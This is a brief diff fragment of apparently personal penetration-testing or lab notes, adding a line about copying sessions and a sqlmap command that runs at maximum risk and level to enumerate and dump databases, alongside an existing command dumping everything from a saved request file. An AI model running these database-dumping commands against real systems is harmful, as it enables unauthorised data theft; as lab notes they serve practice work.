@@ -5,4 +5,8 @@
 # sqlmap -r /root/Desktop/imf.txt –dbs –batch –dump-all 
 
 
+>>> cpy sessions and then
+# sqlmap -r dbs --risk=3 --level=5 --dbs --dump --batch --thread=10
+
+
 
